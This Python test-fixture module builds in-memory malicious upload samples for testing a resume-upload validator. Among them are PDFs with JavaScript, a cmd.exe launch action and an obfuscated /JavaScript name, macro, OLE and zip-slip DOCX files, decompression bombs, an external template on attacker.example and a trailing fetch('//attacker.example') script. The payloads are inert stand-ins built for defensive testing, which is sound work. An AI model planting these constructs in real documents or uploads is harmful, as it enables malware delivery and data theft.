"""Builders for the upload attack corpus and benign test documents.

Everything is generated in memory so the tests document exactly what each
malicious file contains.
"""

from __future__ import annotations

import io
import struct
import zipfile
import zlib
from pathlib import Path

from PIL import Image
from pypdf import PdfWriter
from pypdf.generic import ArrayObject, DictionaryObject, NameObject, TextStringObject

REPO_ROOT = Path(__file__).resolve().parents[5]
SAMPLES = REPO_ROOT / "samples" / "resumes"

RESUME_TEXT = """Alex Rivera
Platform Engineer
Denver, CO · alex.rivera@example.com

SUMMARY
Platform engineer with 6 years of experience running Kubernetes and Terraform on AWS. Reduced deployment time by 70%.

EXPERIENCE
Platform Engineer — Northwind Cloud, Denver, CO
Feb 2022 – Present
- Operated 4 Kubernetes clusters with 300 nodes using Terraform and Argo CD.
- Cut monthly cloud spend by 25% with spot instances.

Systems Engineer — Contoso Retail, Remote
Jun 2019 – Jan 2022
- Automated Linux provisioning with Ansible for 500 servers.

SKILLS
Cloud: AWS, Terraform, Kubernetes, Helm
Languages: Python, Go

EDUCATION
- B.S. Computer Engineering, Example State University
"""


def sample(name: str) -> bytes:
    return (SAMPLES / name).read_bytes()


# ----------------------------------------------------------------------- PDF


def pdf_bytes(mutate=None, *, encrypt_with: str | None = None, text: str | None = None) -> bytes:
    if text is not None:
        from reportlab.lib.pagesizes import letter
        from reportlab.pdfgen import canvas

        buffer = io.BytesIO()
        pdf = canvas.Canvas(buffer, pagesize=letter)
        y = 750
        for line in text.split("\n"):
            pdf.drawString(50, y, line)
            y -= 14
            if y < 50:
                pdf.showPage()
                y = 750
        pdf.save()
        data = buffer.getvalue()
        if mutate is None and encrypt_with is None:
            return data
        from pypdf import PdfReader

        writer = PdfWriter(clone_from=PdfReader(io.BytesIO(data)))
    else:
        writer = PdfWriter()
        writer.add_blank_page(612, 792)
    if mutate is not None:
        mutate(writer)
    if encrypt_with is not None:
        writer.encrypt(user_password=encrypt_with, owner_password="owner-secret", algorithm="AES-128")
    out = io.BytesIO()
    writer.write(out)
    return out.getvalue()


def pdf_with_javascript() -> bytes:
    def mutate(writer: PdfWriter) -> None:
        writer.add_js("app.alert('pwned');")

    return pdf_bytes(mutate)


def pdf_with_open_action_launch() -> bytes:
    def mutate(writer: PdfWriter) -> None:
        writer._root_object[NameObject("/OpenAction")] = DictionaryObject(
            {NameObject("/S"): NameObject("/Launch"), NameObject("/F"): TextStringObject("cmd.exe")}
        )

    return pdf_bytes(mutate)


def pdf_with_embedded_file() -> bytes:
    def mutate(writer: PdfWriter) -> None:
        writer.add_attachment("payload.exe", b"MZ\x90\x00not really")

    return pdf_bytes(mutate)


def pdf_with_xfa() -> bytes:
    def mutate(writer: PdfWriter) -> None:
        writer._root_object[NameObject("/AcroForm")] = DictionaryObject(
            {NameObject("/Fields"): ArrayObject(), NameObject("/XFA"): TextStringObject("<xdp/>")}
        )

    return pdf_bytes(mutate)


def pdf_with_rich_media() -> bytes:
    def mutate(writer: PdfWriter) -> None:
        annotation = DictionaryObject(
            {
                NameObject("/Type"): NameObject("/Annot"),
                NameObject("/Subtype"): NameObject("/RichMedia"),
                NameObject("/Rect"): ArrayObject([]),
            }
        )
        writer.pages[0][NameObject("/Annots")] = ArrayObject([writer._add_object(annotation)])

    return pdf_bytes(mutate)


def pdf_with_obfuscated_javascript() -> bytes:
    """``/J#61vaScript`` is ``/JavaScript`` with a hex escape (classic evasion)."""
    base = pdf_bytes()
    marker = b"/Type /Catalog"
    return base.replace(marker, marker + b" /Names << /J#61vaScript 99 0 R >>", 1)


def pdf_with_trailing_zip() -> bytes:
    return pdf_bytes() + docx_bytes()


def pdf_with_trailing_html() -> bytes:
    return pdf_bytes() + b"\n<html><script>alert(1)</script></html>" * 60


# ---------------------------------------------------------------------- DOCX


def docx_bytes(paragraphs: list[str] | None = None) -> bytes:
    import docx

    document = docx.Document()
    for text in paragraphs or [
        "Alex Rivera",
        "Platform Engineer",
        "EXPERIENCE",
        "Platform Engineer at Northwind",
    ]:
        document.add_paragraph(text)
    buffer = io.BytesIO()
    document.save(buffer)
    return buffer.getvalue()


def _rewrite_zip(
    data: bytes, *, add: dict[str, bytes] | None = None, replace: dict[str, bytes] | None = None
) -> bytes:
    source = zipfile.ZipFile(io.BytesIO(data))
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as target:
        for info in source.infolist():
            payload = (replace or {}).get(info.filename, source.read(info.filename))
            target.writestr(info.filename, payload)
        for name, payload in (add or {}).items():
            target.writestr(name, payload)
    return out.getvalue()


def docm_with_macro() -> bytes:
    data = docx_bytes()
    content_types = (
        zipfile.ZipFile(io.BytesIO(data))
        .read("[Content_Types].xml")
        .replace(
            b"application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml",
            b"application/vnd.ms-word.document.macroEnabled.main+xml",
        )
    )
    return _rewrite_zip(
        data,
        add={"word/vbaProject.bin": b"\xd0\xcf\x11\xe0fake-vba-project"},
        replace={"[Content_Types].xml": content_types},
    )


def docx_with_activex() -> bytes:
    return _rewrite_zip(docx_bytes(), add={"word/activeX/activeX1.xml": b"<ax:ocx/>"})


def docx_with_ole_object() -> bytes:
    return _rewrite_zip(docx_bytes(), add={"word/embeddings/oleObject1.bin": b"\xd0\xcf\x11\xe0ole"})


def docx_with_external_template() -> bytes:
    data = docx_bytes()
    rels = (
        b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        b'<Relationship Id="rId99" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"'
        b' Target="http://attacker.example/template.dotm" TargetMode="External"/>'
        b'<Relationship Id="rId98" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"'
        b' Target="https://linkedin.example/in/alex" TargetMode="External"/>'
        b"</Relationships>"
    )
    return _rewrite_zip(data, add={"word/_rels/settings.xml.rels": rels})


def zip_bomb_docx() -> bytes:
    """A real DOCX plus one member that inflates ~1000x (5 MB of zeros)."""
    return _rewrite_zip(docx_bytes(), add={"word/media/bomb.bin": b"\x00" * (5 * 1024 * 1024)})


def plain_zip() -> bytes:
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w") as archive:
        archive.writestr("readme.txt", "not a resume")
    return out.getvalue()


def docx_with_zip_slip() -> bytes:
    return _rewrite_zip(docx_bytes(), add={"../../evil.sh": b"#!/bin/sh"})


# -------------------------------------------------------------------- images


def png_bytes(width: int = 800, height: int = 1000, color: str = "white") -> bytes:
    buffer = io.BytesIO()
    Image.new("RGB", (width, height), color).save(buffer, format="PNG")
    return buffer.getvalue()


def jpeg_bytes(width: int = 800, height: int = 1000) -> bytes:
    buffer = io.BytesIO()
    Image.new("RGB", (width, height), "white").save(buffer, format="JPEG", quality=80)
    return buffer.getvalue()


def _png_chunk(kind: bytes, payload: bytes) -> bytes:
    return (
        struct.pack(">I", len(payload))
        + kind
        + payload
        + struct.pack(">I", zlib.crc32(kind + payload) & 0xFFFFFFFF)
    )


def png_declaring_huge_dimensions(width: int = 50_000, height: int = 50_000) -> bytes:
    """Decompression bomb: the header claims 2.5 gigapixels."""
    ihdr = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
    idat = zlib.compress(b"\x00" * 1024)
    return (
        b"\x89PNG\r\n\x1a\n"
        + _png_chunk(b"IHDR", ihdr)
        + _png_chunk(b"IDAT", idat)
        + _png_chunk(b"IEND", b"")
    )


def jpeg_with_appended_zip() -> bytes:
    return jpeg_bytes() + docx_bytes()


def png_with_trailing_script() -> bytes:
    return png_bytes() + b"<script>fetch('//attacker.example')</script>"


def truncated_png() -> bytes:
    data = png_bytes(1200, 1600, "gray")
    return data[: len(data) // 2]


# ---------------------------------------------------------------- executables


def windows_exe() -> bytes:
    return (
        b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
        + b"\x00" * 200
        + b"This program cannot be run in DOS mode"
    )


def elf_binary() -> bytes:
    return b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 400


def gif_bytes() -> bytes:
    buffer = io.BytesIO()
    Image.new("RGB", (400, 400), "white").save(buffer, format="GIF")
    return buffer.getvalue()


def legacy_doc() -> bytes:
    return b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 1024
